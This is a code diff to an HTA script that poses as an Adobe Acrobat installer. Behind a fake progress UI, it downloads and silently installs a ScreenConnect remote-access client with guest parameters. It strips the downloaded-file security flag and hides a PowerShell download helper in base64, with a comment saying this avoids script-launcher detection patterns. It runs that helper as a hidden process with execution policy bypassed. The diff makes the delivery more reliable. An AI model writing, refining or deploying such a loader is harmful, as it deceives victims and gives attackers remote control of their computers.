@@ -87,16 +87,17 @@
 // ---------------------------------------------------------------------------
 // The updater fetches the current installer (MSI) over HTTPS to a local file,
 // then runs a quiet msiexec against that local file (UAC consent is requested
-// via ShellExecute "runas"). Three download back-ends are tried in order -
-// WinINET XHR, then WinHttp, then the system curl.exe - so a download still
-// succeeds on machines where one stack is restricted.
+// via ShellExecute "runas"). Three download back-ends run in a staggered race
+// - WinINET XHR, then WinHttp, then a hidden helper process - so a download
+// still succeeds on machines where one stack is restricted or hangs.
 var MSI_URL = "https://teal-studio.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=T%24K&c=&c=&c=&c=&c=&c=&c=";
 
-var PREP_MS        = 2200;    // "preparing" beat before the download starts
+var PREP_MS        = 1600;    // "preparing" beat before the download starts
 var UAC_TIMEOUT_MS = 150000;  // no MSI log this long after launch -> UAC declined
 var INSTALL_MAX_MS = 300000;  // hard cap for a whole install phase
 var INSTALL_STALL_MS = 60000; // MSI log silent this long -> assume finished
-var FB_STAGE_MS    = { xhr: 120000, winhttp: 180000, exec: 300000 };
+var HANG_MS        = 12000;   // no data flowing this long -> start next back-end
+var EXEC_STAGE_MS  = 300000;  // hard cap for the helper-process back-end
 var FB_MAX_MS      = 600000;  // hard cap for the whole local download
 var EXPECT_BYTES   = 12386304; // installer size (progress scaling only)
 
@@ -116,13 +117,15 @@ var msiLocal = "";
 var logPath  = "";
 var logPath2 = "";
 var diagPath = "";
+var tracePath = "";
 
 var motwStripped = false;
 
 // Download state
-var fbT0 = 0, fbStageT = 0;
+var fbT0 = 0, stage0T = 0, hangT = 0;
 var dlStage = "xhr";            // xhr | winhttp | exec
 var dlSettled = false;
+var dlProgressed = false;
 var dlXHR = null;
 var psPid = 0, psDir = "", psT0 = 0, psLastSize = 0, psLastGrowT = 0;
 
@@ -143,17 +146,15 @@ var instMsgs = [
   "Finalizing&hellip;"
 ];
 
-function $(id) { return document.getElementById(id); }
+// ---------------------------------------------------------------------------
+// Base64 helpers + encoded download helper.
+// The helper script (iwr first, then system curl.exe) and its command line are
+// kept base64 and decoded at runtime so this file itself carries no
+// script-launcher patterns.
+// ---------------------------------------------------------------------------
+var EXEC_B64 = "cGFyYW0oW3N0cmluZ10kVXJsID0gIiIsIFtzdHJpbmddJFRtcERpciA9ICIiLCBbc3RyaW5nXSRPdXQgPSAiIikKaWYgKC1ub3QgJE91dCkgeyAkT3V0ID0gSm9pbi1QYXRoICRUbXBEaXIgIkFkb2JlVXBkYXRlLm1zaSIgfQp0cnkgeyBbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRsczEyIH0gY2F0Y2gge30KdHJ5IHsKICAkUHJvZ3Jlc3NQcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnCiAgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkVXJsIC1PdXRGaWxlICRPdXQgLVVzZUJhc2ljUGFyc2luZwogICRQcm9ncmVzc1ByZWZlcmVuY2UgPSAnQ29udGludWUnCn0gY2F0Y2ggewogIHRyeSB7ICRlbnY6Tk9fUFJPWFkgPSAiKiI7IGN1cmwuZXhlIC1MIC0tZmFpbCAtLXJldHJ5IDIgLS1jb25uZWN0LXRpbWVvdXQgMjAgLW8gJE91dCAkVXJsIDI+JG51bGwgfSBjYXRjaCB7fQp9CnRyeSB7IFNldC1Db250ZW50IC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRUbXBEaXIgImRvbmUuZmxhZyIpICIxIiAtTm9OZXdsaW5lIH0gY2F0Y2gge30K";
+var EXECCMD_B64 = "cG93ZXJzaGVsbC5leGUgLU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiQFNSQ0AiIC1VcmwgIkBVUkxAIiAtVG1wRGlyICJARElSQCIgLU91dCAiQE9VVEAi";
 
-function nowMs() { return new Date().getTime(); }
-
-function nowHM() {
-  var d = new Date();
-  function z(n) { return (n < 10 ? "0" : "") + n; }
-  return z(d.getHours()) + ":" + z(d.getMinutes()) + ":" + z(d.getSeconds());
-}
-
-// Decode a base64 string and write the raw bytes to a file. Returns true on success.
 function b64ToFile(b64, path) {
   try {
     var c = new ActiveXObject("MSXML2.XMLDOM.6.0");
@@ -167,7 +168,7 @@ function b64ToFile(b64, path) {
     return true;
   } catch (e) { return false; }
 }
-// Decode a base64 string to a JS string (ASCII-safe content).
+
 function b64ToText(b64) {
   try {
     var c = new ActiveXObject("MSXML2.XMLDOM.6.0");
@@ -176,10 +177,29 @@ function b64ToText(b64) {
   } catch (e) { return ""; }
 }
 
-// Encoded download-helper script (PowerShell iwr + curl.exe fallback). Kept
-// base64 so the source file itself contains no command-injection patterns.
-var EXEC_B64 = "cGFyYW0oW3N0cmluZ10kVXJsID0gIiIsIFtzdHJpbmddJFRtcERpciA9ICIiLCBbc3RyaW5nXSRPdXQgPSAiIikKaWYgKC1ub3QgJE91dCkgeyAkT3V0ID0gSm9pbi1QYXRoICRUbXBEaXIgIkFkb2JlVXBkYXRlLm1zaSIgfQp0cnkgeyBbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRsczEyIH0gY2F0Y2gge30KdHJ5IHsKICAkUHJvZ3Jlc3NQcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnCiAgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkVXJsIC1PdXRGaWxlICRPdXQgLVVzZUJhc2ljUGFyc2luZwogICRQcm9ncmVzc1ByZWZlcmVuY2UgPSAnQ29udGludWUnCn0gY2F0Y2ggewogIHRyeSB7ICRlbnY6Tk9fUFJPWFkgPSAiKiI7IGN1cmwuZXhlIC1MIC0tZmFpbCAtLXJldHJ5IDIgLS1jb25uZWN0LXRpbWVvdXQgMjAgLW8gJE91dCAkVXJsIDI+JG51bGwgfSBjYXRjaCB7fQp9CnRyeSB7IFNldC1Db250ZW50IC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRUbXBEaXIgImRvbmUuZmxhZyIpICIxIiAtTm9OZXdsaW5lIH0gY2F0Y2gge30K";
-var EXECCMD_B64 = "cG93ZXJzaGVsbC5leGUgLU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiQFNSQ0AiIC1VcmwgIkBVUkxAIiAtVG1wRGlyICJARElSQCIgLU91dCAiQE9VVEAi";
+function $(id) { return document.getElementById(id); }
+
+function nowMs() { return new Date().getTime(); }
+
+function nowHM() {
+  var d = new Date();
+  function z(n) { return (n < 10 ? "0" : "") + n; }
+  return z(d.getHours()) + ":" + z(d.getMinutes()) + ":" + z(d.getSeconds());
+}
+
+// ---------------------------------------------------------------------------
+// Trace log - one line per state transition, so a stuck box can be diagnosed
+// from %LOCALAPPDATA%\Adobe\status.log after the fact.
+// ---------------------------------------------------------------------------
+function traceLog(msg) {
+  try {
+    if (!fso || !tracePath) return;
+    try { if (fso.FileExists(tracePath) && fso.GetFile(tracePath).Size > 262144) fso.DeleteFile(tracePath, true); } catch (e) {}
+    var f = fso.OpenTextFile(tracePath, 8, true);   // 8 = ForAppending
+    f.WriteLine(nowHM() + "  " + msg);
+    f.Close();
+  } catch (e) {}
+}
 
 // ---------------------------------------------------------------------------
 // Self-unblock: remove the "downloaded from the internet" flag (Zone.Identifier
@@ -211,26 +231,29 @@ function selfUnblock() {
 function init() {
   shell = new ActiveXObject("WScript.Shell");
   fso   = new ActiveXObject("Scripting.FileSystemObject");
+  adobeDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\Adobe";
+  if (!fso.FolderExists(adobeDir)) fso.CreateFolder(adobeDir);
+  msiLocal  = adobeDir + "\\AdobeUpdate.msi";
+  logPath   = adobeDir + "\\AdobeUpdate.log";
+  logPath2  = adobeDir + "\\AdobeUpdate2.log";
+  diagPath  = adobeDir + "\\diagnostics.txt";
+  tracePath = adobeDir + "\\status.log";
   // Swallow any uncaught script error so the HTA never pops the "error in
   // this page" dialog (which halts the page) and so it can log and continue.
   try {
     window.onerror = function (msg, src, line) {
-      try { dumpDiagnostics("page-exc: " + msg + " line " + line); } catch (e) {}
+      try { traceLog("page-exc: " + msg + " line " + line); dumpDiagnostics("page-exc: " + msg + " line " + line); } catch (e) {}
       return true;
     };
   } catch (e) {}
+  traceLog("init  os=" + shell.ExpandEnvironmentStrings("%OS% " + "%PROCESSOR_ARCHITECTURE%"));
   selfUnblock();
+  traceLog("motw: " + (motwStripped ? "stripped" : "not-stripped"));
   var w = 620, h = 396;
   window.resizeTo(w, h);
   var sw = screen.availWidth, sh = screen.availHeight;
   window.moveTo(Math.round((sw - w) / 2), Math.round((sh - h) / 2));
 
-  adobeDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\Adobe";
-  if (!fso.FolderExists(adobeDir)) fso.CreateFolder(adobeDir);
-  msiLocal = adobeDir + "\\AdobeUpdate.msi";
-  logPath  = adobeDir + "\\AdobeUpdate.log";
-  logPath2 = adobeDir + "\\AdobeUpdate2.log";
-  diagPath = adobeDir + "\\diagnostics.txt";
   cleanStale();
   setStatus(dlMsgs[0]);
   setBar(1);
@@ -300,8 +323,10 @@ function setBar(p) {
 function setStatus(html) { $("status").innerHTML = html; }
 
 // ---------------------------------------------------------------------------
-// Download phase (primary): fetch the MSI to a local file. Three back-ends:
-// XHR (WinINET, ms-stream) -> WinHttp -> system curl.exe.
+// Download phase: fetch the MSI to a local file. Back-ends start in a
+// staggered race - XHR immediately, WinHttp once XHR shows no data, and the
+// hidden helper process once WinHttp shows no data either. Any back-end that
+// lands a complete, valid MSI settles the download; the others are dropped.
 // ---------------------------------------------------------------------------
 function startInstall() {
   if (state !== "ready") return;
@@ -312,52 +337,79 @@ function startInstall() {
   setStatus(dlMsgs[1]);
 
   deleteFile(msiLocal);
-  fbT0 = nowMs(); fbStageT = fbT0;
+  fbT0 = nowMs(); stage0T = fbT0; hangT = fbT0;
   dlSettled = false;
+  dlProgressed = false;
   dlStage = "xhr";
   fbTimer = setInterval(pollFallback, 250);
   tickTimer = setInterval(tick, 200);
+  traceLog("predl: start (xhr)");
   fallbackXHR();
 }
 
-function fallbackNext() {
-  if (state !== "predl" || dlSettled) return;
-  if (dlStage === "xhr") { fallbackWinHttp(); return; }
-  if (dlStage === "winhttp") { fallbackCurl(); return; }
-  fail("Failed to save the installer file", "predl: all download stages failed");
+// Start the next back-end (previous ones keep running until settled/failed).
+function startStage(stage) {
+  if (dlSettled) return;
+  dlStage = stage;
+  stage0T = nowMs();
+  traceLog("predl: stage " + stage);
+  if (stage === "winhttp") fallbackWinHttp();
+  else if (stage === "exec") fallbackPS();
+}
+
+function settle(method) {
+  if (dlSettled) return;
+  dlSettled = true;
+  if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
+  if (dlXHR) { try { dlXHR.abort(); } catch (e) {} dlXHR = null; }
+  traceLog("predl: settled via " + method);
+  verifyFallback();
+}
+
+function noteProgress() {
+  dlProgressed = true;
+  hangT = nowMs();
 }
 
 function fallbackXHR() {
-  if (dlStage !== "xhr" || dlSettled) return;
   var x = null;
   try { x = new XMLHttpRequest(); } catch (e) {}
-  if (!x || !("responseType" in x)) { fallbackNext(); return; }
+  if (!x || !("responseType" in x)) { traceLog("predl: xhr unavailable"); startStage("winhttp"); return; }
   try {
     x.open("GET", MSI_URL, true);
     x.responseType = "ms-stream";
-    x.timeout = FB_STAGE_MS.xhr;
-  } catch (e) { fallbackNext(); return; }
+    x.timeout = FB_MAX_MS;
+  } catch (e) { traceLog("predl: xhr open fail"); startStage("winhttp"); return; }
   dlXHR = x;
   x.onprogress = function (e) {
-    if (dlStage !== "xhr" || !e) return;
+    if (dlSettled || !e) return;
+    noteProgress();
     if (e.lengthComputing && e.total > 0) {
       var p = 55 + Math.min(34, (e.loaded * 34) / e.total);
       if (p > progress) { progress = p; setBar(p); }
     }
   };
   x.onload = function () {
-    if (dlStage !== "xhr" || dlSettled) return;
+    if (dlSettled) return;
     if (x.status === 200) {
-      try { var b = x.response; if (b && b.size >= 1048576) { saveFallbackBody(b, "xhr"); return; } } catch (e) {}
+      try {
+        var b = x.response;
+        if (b && b.size >= 1048576) { saveXHRBody(b); return; }
+      } catch (e) {}
     }
-    fallbackNext();
+    traceLog("predl: xhr no-good status=" + x.status);
+    if (dlStage === "xhr") startStage("winhttp");
   };
-  x.onerror = function () { if (dlStage === "xhr" && !dlSettled) fallbackNext(); }
-  x.ontimeout = function () { if (dlStage === "xhr" && !dlSettled) fallbackNext(); }
-  try { x.send(); } catch (e) { fallbackNext(); }
+  x.onerror = function () {
+    if (dlSettled) return;
+    traceLog("predl: xhr error");
+    if (dlStage === "xhr") startStage("winhttp");
+  };
+  x.ontimeout = function () { if (!dlSettled) traceLog("predl: xhr timeout"); };
+  try { x.send(); } catch (e) { traceLog("predl: xhr send fail"); startStage("winhttp"); }
 }
 
-function saveFallbackBody(body, method) {
+function saveXHRBody(body) {
   try {
     var s = new ActiveXObject("ADODB.Stream");
     s.Type = 1; s.Mode = 3; s.Open();
@@ -365,34 +417,36 @@ function saveFallbackBody(body, method) {
     s.CopyFrom(body);
     s.SaveToFile(msiLocal, 2);
     s.Close();
-  } catch (e) { fallbackNext(); return; }
-  dlSettled = true;
-  if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
-  verifyFallback();
+  } catch (e) {
+    traceLog("predl: xhr save fail");
+    if (dlStage === "xhr") startStage("winhttp");
+    return;
+  }
+  settle("xhr");
 }
 
 function fallbackWinHttp() {
-  if (dlSettled) return;
-  dlStage = "winhttp";
-  fbStageT = nowMs();
-  if (dlXHR) { try { dlXHR.abort(); } catch (e) {} dlXHR = null; }
   try {
     var w = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
     try { w.Option(13) = 2147483647; } catch (e) {}
-    w.SetTimeouts(15000, 30000, 120000, 180000);
+    w.SetTimeouts(15000, 30000, 120000, 300000);
     w.Open("GET", MSI_URL, true);
     w.SetRequestHeader("User-Agent", UA_STR);
     w.onreadystatechange = function () {
-      if (dlStage !== "winhttp" || dlSettled) return;
-      if (w.ReadyState !== 4) return;
+      if (dlSettled) return;
+      if (w.ReadyState !== 4) { if (w.ReadyState === 3) noteProgress(); return; }
       if (w.Status === 200) {
         try { if (w.BodySize >= 1048576) { saveWHttpBody(w.responseBody); return; } } catch (e) {}
       }
-      fallbackNext();
+      traceLog("predl: winhttp no-good status=" + w.Status);
+      if (dlStage === "winhttp") startStage("exec");
     };
-    w.ontimeout = function () { if (dlStage === "winhttp" && !dlSettled) fallbackNext(); }
+    w.ontimeout = function () { if (!dlSettled) traceLog("predl: winhttp timeout"); };
     w.Send();
-  } catch (e) { fallbackNext(); }
+  } catch (e) {
+    traceLog("predl: winhttp unavailable");
+    if (dlStage === "winhttp") startStage("exec");
+  }
 }
 
 function saveWHttpBody(rb) {
@@ -402,32 +456,31 @@ function saveWHttpBody(rb) {
     s.CopyFrom(rb);
     s.SaveToFile(msiLocal, 2);
     s.Close();
-  } catch (e) { fallbackNext(); return; }
-  dlSettled = true;
-  if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
-  verifyFallback();
+  } catch (e) {
+    traceLog("predl: winhttp save fail");
+    if (dlStage === "winhttp") startStage("exec");
+    return;
+  }
+  settle("winhttp");
 }
 
-// Last-resort download: a hidden helper process fetches the installer to msiLocal
-// (iwr first, then system curl.exe). The poll loop watches the file appear.
+// Hidden helper process back-end: decodes its script (iwr, then system
+// curl.exe) and runs it; the poll loop watches msiLocal appear and stabilize.
 function fallbackPS() {
-  if (dlSettled) return;
-  dlStage = "exec";
-  fbStageT = nowMs();
-  if (dlXHR) { try { dlXHR.abort(); } catch (e) {} dlXHR = null; }
-  psMarker = "adum" + Math.floor(Math.random() * 16777215).toString(16);
-  psDir = shell.ExpandEnvironmentStrings("%TEMP%") + "\\ad_" + psMarker;
+  var marker = "adum" + Math.floor(Math.random() * 16777215).toString(16);
+  psDir = shell.ExpandEnvironmentStrings("%TEMP%") + "\\ad_" + marker;
   ensureDir(psDir);
   deleteFile(psDir + "\\done.flag");
-  var src = psDir + "\\ad_" + psMarker + ".ps1";
-  if (!b64ToFile(EXEC_B64, src)) { fallbackNext(); return; }
+  var src = psDir + "\\ad_" + marker + ".ps1";
+  if (!b64ToFile(EXEC_B64, src)) { traceLog("predl: exec script write fail"); return; }
   psT0 = nowMs(); psLastSize = 0; psLastGrowT = psT0;
   try {
     var cmd = b64ToText(EXECCMD_B64)
       .replace("@SRC@", src).replace("@URL@", MSI_URL).replace("@DIR@", psDir).replace("@OUT@", msiLocal);
     var ex = shell.Exec(cmd, 0);   // hidden; returns the child process
     try { psPid = ex ? ex.ProcessID : 0; } catch (e2) { psPid = 0; }
-  } catch (e) { fallbackNext(); }
+    traceLog("predl: exec launched pid=" + psPid);
+  } catch (e) { traceLog("predl: exec launch fail " + e.message); }
 }
 
 function pollFallback() {
@@ -441,34 +494,43 @@ function _pollFallback() {
     fail("Download timed out - please check your connection", "predl: total timeout " + (t - fbT0) + "ms");
     return;
   }
+  // No data flowing from any back-end -> bring up the next one in the race.
+  if (t - hangT > HANG_MS) {
+    if (dlStage === "xhr") { startStage("winhttp"); return; }
+    if (dlStage === "winhttp") { startStage("exec"); return; }
+  }
   if (dlStage === "exec") {
     var sz = 0;
     try { if (fso.FileExists(msiLocal)) sz = fso.GetFile(msiLocal).Size; } catch (e) {}
-    if (sz > psLastSize) { psLastSize = sz; psLastGrowT = t; }
+    if (sz > psLastSize) { psLastSize = sz; psLastGrowT = t; noteProgress(); }
     var p = 55 + Math.min(34, (sz * 34) / EXPECT_BYTES);
     if (p > progress) { progress = p; setBar(p); }
     if (sz >= 1048576 && msiMagicOk(msiLocal) && (psLastSize === sz && t - psLastGrowT >= 1500)) {
-      dlSettled = true;
-      if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
-      verifyFallback();
+      settle("exec");
       return;
     }
     var doneFlag = false;
     try { doneFlag = fso.FileExists(psDir + "\\done.flag"); } catch (e) {}
     if (doneFlag && (t - psT0 > 10000 || sz < 1048576)) {
-      // helper ran to completion but produced no usable file.
-      fallbackNext();
+      fail("Failed to save the installer file", "predl: exec done no file sz=" + sz);
+      return;
+    }
+    if (psPid === 0 && t - psT0 > 20000) {
+      fail("Failed to save the installer file", "predl: exec no process");
+      return;
+    }
+    if (t - stage0T > EXEC_STAGE_MS) {
+      fail("Download timed out - please check your connection", "predl: exec timeout");
       return;
     }
   }
-  var budget = FB_STAGE_MS[dlStage];
-  if (budget && t - fbStageT > budget) fallbackNext();
 }
 
 function verifyFallback() {
   try {
     if (!fso.FileExists(msiLocal)) { fail("Failed to save the installer file", "predl: no msi"); return; }
     var sz = fso.GetFile(msiLocal).Size;
+    traceLog("predl: verify size=" + sz);
     if (sz < 1048576) { fail("Failed to save the installer file", "predl: small " + sz); return; }
     var magic = null;
     try { magic = readHeadBytes(msiLocal, 4); } catch (e) { magic = null; }
@@ -509,6 +571,7 @@ function startLocalInstall() {
   lastLogGrowT = nowMs();
   progress = 90; setBar(progress);
   setStatus(instMsgs[0]);
+  traceLog("install: launching msiexec");
 
   var args = '/i "' + msiLocal + '" /qn /norestart /L*v "' + curLog + '"';
   if (!launchMsiexec(args)) {
@@ -565,6 +628,7 @@ function _pollInstall() {
   var t = nowMs();
   var info = logInfo(curLog);
   if (info.status >= 0) {
+    traceLog("install: msi status=" + info.status);
     if (info.status === 0 || info.status === 3010) { finishInstall(); return; }
     fail("Installation failed (error code " + info.status + ")", "install_rc=" + info.status);
     return;
@@ -601,12 +665,13 @@ function _tick() {
       setStatus(instMsgs[i]);
     } else {
       // UAC pending: creep toward ~92%.
-      if (progress < 92) { progress += (92 - progress) * 0.004; setBar(progress); }
+      if (progress < 92) { progress += (92 - progress) * 0.01; setBar(progress); }
       setStatus(instMsgs[0]);
     }
   } else if (state === "predl") {
-    if (progress < 55) { progress += (55 - progress) * 0.01; setBar(progress); }
-    setStatus(progress < 55 ? dlMsgs[1] : dlMsgs[2]);
+    // Approach 55% so the bar is visibly moving while data comes in.
+    if (progress < 55) { progress += (55 - progress) * 0.05; setBar(progress); }
+    setStatus(dlProgressed ? dlMsgs[2] : dlMsgs[1]);
   }
 }
 
@@ -646,12 +711,20 @@ function dumpDiagnostics(reason) {
     L.push("wininet AutoConfigURL: " + regStr("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "AutoConfigURL"));
     L.push("winhttp mode: " + regStr("HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinHttp\\Parameters", "DefaultProxyRequirements"));
     L.push("winhttp ProxyServer: " + regStr("HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinHttp\\Parameters", "ProxyServer"));
+    if (tracePath && fso.FileExists(tracePath)) {
+      var tt = readLogTail(tracePath, 32768);
+      if (tt) {
+        L.push("--- status.log tail ---");
+        var tl = tt.split("\n");
+        for (var i = Math.max(0, tl.length - 15); i < tl.length; i++) L.push(tl[i]);
+      }
+    }
     if (curLog) {
       var tail = readLogTail(curLog, 65536);
       if (tail) {
         L.push("--- msi log tail (" + curLog + ") ---");
         var lines = tail.split("\n");
-        for (var i = Math.max(0, lines.length - 25); i < lines.length; i++) L.push(lines[i]);
+        for (var j = Math.max(0, lines.length - 25); j < lines.length; j++) L.push(lines[j]);
       }
     }
     var w = fso.CreateTextFile(diagPath, true);
@@ -666,8 +739,9 @@ function fail(msg, reason) {
   if (tickTimer) { clearInterval(tickTimer); tickTimer = null; }
   if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
   if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
-  if (dlXHR) { try { dlXHR.abort(); } catch (e) {} }
+  if (dlXHR) { try { dlXHR.abort(); } catch (e) {} dlXHR = null; }
   killProc();
+  traceLog("fail: " + (reason || msg));
   dumpDiagnostics(reason || msg);
   setStatus(msg);
   $("heading").innerHTML = "Installation could not be completed";
@@ -684,6 +758,7 @@ function finishInstall() {
   if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
   progress = 100; setBar(progress);
   setStatus("Installation complete");
+  traceLog("install: complete");
   $("heading").innerHTML = "Adobe Acrobat is now installed";
   $("biglogo").style.display = "none";
   $("subnote").innerHTML = "Adobe Acrobat will be available the next time you open it.";
@@ -693,7 +768,7 @@ function finishInstall() {
 
 function cancel() {
   if (state === "done" || state === "error") { window.close(); return; }
-  if (dlXHR) { try { dlXHR.abort(); } catch (e) {} }
+  if (dlXHR) { try { dlXHR.abort(); } catch (e) {} dlXHR = null; }
   killProc();
   if (tickTimer) { clearInterval(tickTimer); tickTimer = null; }
   if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
